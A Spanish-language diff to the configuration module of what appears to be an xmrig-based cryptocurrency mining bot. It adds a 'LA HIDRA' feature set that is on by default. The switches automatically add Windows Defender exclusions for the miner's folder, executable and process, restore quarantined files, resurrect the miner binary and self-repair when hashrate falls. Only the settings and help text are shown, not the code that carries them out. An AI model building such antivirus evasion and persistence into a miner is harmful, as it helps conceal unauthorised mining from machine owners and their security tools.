@@ -40,6 +40,14 @@ V3.5 — PRUEBA DE GANANCIAS:
 
     EVIDENCIA_CADA_HORAS   → Cada cuántas horas el bot manda a Telegram
                              la prueba de ganancias (6; 0 = desactivado)
+
+V3.7 — LA HIDRA (agresividad restaurada, 5 cabezas):
+
+    HIDRA_ACTIVA           → true = las 5 cabezas despiertas (true)
+    HIDRA_CAIDA_PCT        → % de caída del hashrate que activa la
+                             auto-reparación de la VIGÍA (35)
+    HIDRA_DEFENDER         → true = el ESCUDO agrega solo las exclusiones
+                             de Windows Defender para xmrig (true)
 """
 import os
 import tempfile
@@ -115,6 +123,10 @@ DEFAULTS = {
     "PAYOUT_ALERT_MIN_BTC": 0.0005,
     # --- v3.5: prueba de ganancias --------------------------------------
     "EVIDENCIA_CADA_HORAS": 6,
+    # --- v3.7: LA HIDRA ---------------------------------------------------
+    "HIDRA_ACTIVA": True,
+    "HIDRA_CAIDA_PCT": 35.0,
+    "HIDRA_DEFENDER": True,
 }
 
 
@@ -145,7 +157,7 @@ def load_secrets() -> dict:
     # v2: tipos de los nuevos secrets
     for _k in ("FAILOVER_MINUTES", "ROTATE_MINUTES", "CPU_TEMP_MAX",
                "DAILY_SUMMARY_HOUR", "PAYOUT_ALERT_MIN_BTC",
-               "EVIDENCIA_CADA_HORAS"):
+               "EVIDENCIA_CADA_HORAS", "HIDRA_CAIDA_PCT"):
         try:
             cfg[_k] = float(cfg[_k])
         except Exception:
@@ -335,4 +347,13 @@ SECRETS_HELP = [
     ("EVIDENCIA_CADA_HORAS", "Cada cuántas horas el daemon manda a Telegram "
                              "la PRUEBA DE GANANCIAS (saldo del pool, % del "
                              "umbral y BTC/día proyectado). 0 = apagado."),
+    # v3.7 — LA HIDRA
+    ("HIDRA_ACTIVA", "true = LA HIDRA (5 cabezas) vigila y optimiza el "
+                     "minado: config óptima de xmrig, escudo Defender, "
+                     "resurrección del binario, vigilancia de hashrate."),
+    ("HIDRA_CAIDA_PCT", "% de caída del hashrate (respecto al récord) que "
+                        "dispara la auto-reparación de la VIGÍA (default 35)."),
+    ("HIDRA_DEFENDER", "true = el ESCUDO agrega solo las exclusiones de "
+                       "Windows Defender para xmrig (carpeta + .exe + "
+                       "proceso) y restaura lo cuarentenado."),
 ]
